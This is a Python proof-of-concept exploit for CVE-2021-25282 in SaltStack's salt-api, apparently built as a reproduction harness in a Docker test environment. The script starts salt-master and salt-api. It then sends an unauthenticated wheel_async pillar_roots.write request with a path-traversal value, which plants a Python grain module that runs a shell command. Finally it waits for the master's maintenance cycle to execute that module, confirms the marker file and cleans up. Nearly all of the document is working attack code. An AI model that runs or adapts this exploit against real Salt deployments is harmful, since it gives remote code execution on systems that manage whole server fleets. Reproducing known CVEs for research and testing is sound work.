#!/usr/bin/env python3
import json
import os
import random
import socket
import string
import subprocess
import time
import requests
import urllib3

# --- Configuration ---
# These absolute paths are correct in the provided Dockerfile environment.
SALT_MASTER_EXEC = "/usr/local/bin/salt-master"
SALT_API_EXEC = "/usr/local/bin/salt-api"

SALT_HOST = "127.0.0.1"
SALT_PORT = 8000
TARGET_COMMAND = "touch /tmp/pwned_by_cve_2021_25282"
EXTMODS_DIR = "/var/cache/salt/master/extmods"

# Salt Master's maintenance interval; we need to wait longer than this.
MAINTENANCE_INTERVAL_SECONDS = 60
# --- End Configuration ---

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def generate_random_string(length=8):
    """Generate a random string."""
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


def wait_for_port(port, host='127.0.0.1', timeout=20.0):
    """Wait for a port to open."""
    print(f"[*] Waiting for API port {host}:{port} to become available...")
    start_time = time.perf_counter()
    while True:
        try:
            with socket.create_connection((host, port), timeout=1):
                print(f"[+] API port {port} is ready!")
                return True
        except (ConnectionRefusedError, socket.timeout):
            time.sleep(0.5)
            if time.perf_counter() - start_time >= timeout:
                return False
        except Exception:
            return False


def start_services():
    """Start salt-master and salt-api."""
    print("[*] Starting salt-master and salt-api services...")
    # Use 'info' level to reduce log volume
    master_proc = subprocess.Popen([SALT_MASTER_EXEC, '-l', 'info'])
    api_proc = subprocess.Popen([SALT_API_EXEC, '-l', 'info'])
    print(f"[+] salt-master PID: {master_proc.pid}, salt-api PID: {api_proc.pid}")

    if not wait_for_port(SALT_PORT):
        print("[-] Failed to start services: API port did not open in time.")
        master_proc.terminate()
        api_proc.terminate()
        return None

    print("[*] API port is open, waiting 5 more seconds for services to fully initialize...")
    time.sleep(5)
    return [master_proc, api_proc]


def exploit_and_wait():
    """Perform the exploit and wait for the result."""
    target_url = f"http://{SALT_HOST}:{SALT_PORT}"

    # 1. Write the payload
    print("[*] Executing exploit, attempting to write payload...")
    rand_basename = generate_random_string()
    payload_filename = f"{rand_basename}.py"
    python_payload = f"import subprocess\ndef exec_cmd(): subprocess.Popen('{TARGET_COMMAND}', shell=True); return{{}}"

    request_data = {
        "eauth": "auto",
        "client": "wheel_async",
        "fun": "pillar_roots.write",
        "data": python_payload,
        "path": f"../../../../../../..{EXTMODS_DIR}/grains/{payload_filename}"
    }

    try:
        response = requests.post(f"{target_url}/run", json=request_data, timeout=15)
        if not (response.status_code == 200 and 'jid' in response.text):
            print(f"[-] Payload write failed. Status code: {response.status_code}")
            return

        print(f"[+] Payload written successfully! JID: {response.json()['return'][0]['jid']}")
    except Exception as e:
        print(f"[-] Error sending request: {e}")
        return

    # 2. Wait for the Master's own maintenance cycle
    wait_time = MAINTENANCE_INTERVAL_SECONDS + 5
    print(f"[*] Waiting {wait_time} seconds for the salt-master maintenance process to load and execute our grain...")
    time.sleep(wait_time)

    # 3. Verify the result
    print("[*] Verifying exploit result...")
    expected_file = TARGET_COMMAND.split(' ')[-1]
    if os.path.exists(expected_file):
        print(f"\n[SUCCESS] Exploit successful! File '{expected_file}' was created.\n")
    else:
        print(f"[FAIL] Verification failed. File '{expected_file}' not found.")


def main():
    processes = start_services()
    if processes:
        try:
            exploit_and_wait()
        finally:
            print("[*] --- Starting cleanup ---")
            for proc in reversed(processes):
                if proc.poll() is None:
                    print(f"[*] Terminating process (PID: {proc.pid})...")
                    proc.terminate()
                    proc.wait()

            expected_file = TARGET_COMMAND.split(' ')[-1]
            if os.path.exists(expected_file):
                os.remove(expected_file)
                print(f"[*] Removed created file: {expected_file}")
            print("[*] --- Cleanup complete ---")


if __name__ == "__main__":
    main()
